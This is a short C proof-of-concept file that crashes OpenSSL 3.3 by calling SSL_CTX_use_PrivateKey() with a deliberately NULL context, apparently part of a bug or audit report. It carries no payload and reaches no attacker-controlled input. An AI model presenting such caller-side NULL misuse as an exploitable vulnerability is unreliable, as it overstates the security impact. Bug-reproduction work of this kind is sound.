/*
 * PoC: SF01 — NULL pointer dereference in SSL_CTX_use_PrivateKey()
 * Target: OpenSSL 3.3 (openssl33/ssl/ssl_rsa.c)
 *
 * Trigger: call SSL_CTX_use_PrivateKey(NULL, valid_pkey)
 * Crash:   ssl_rsa.c:371 — ctx->cert deref with NULL ctx
 */

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <stdio.h>

static EVP_PKEY *make_rsa_key(void)
{
    EVP_PKEY_CTX *kctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    EVP_PKEY *pkey = NULL;
    if (!kctx) return NULL;
    EVP_PKEY_keygen_init(kctx);
    EVP_PKEY_CTX_set_rsa_keygen_bits(kctx, 2048);
    EVP_PKEY_keygen(kctx, &pkey);
    EVP_PKEY_CTX_free(kctx);
    return pkey;
}

int main(void)
{
    OPENSSL_init_ssl(0, NULL);

    EVP_PKEY *pkey = make_rsa_key();
    if (!pkey) { fputs("key gen failed\n", stderr); return 1; }

    /*
     * SSL_CTX_use_PrivateKey() checks pkey != NULL but never checks ctx.
     * When ctx is NULL the first member access ctx->cert at line 371
     * dereferences address 0x0+offset → SIGSEGV.
     */
    SSL_CTX *ctx = NULL;   /* intentionally NULL */
    SSL_CTX_use_PrivateKey(ctx, pkey);   /* crash here */

    EVP_PKEY_free(pkey);
    return 0;
}
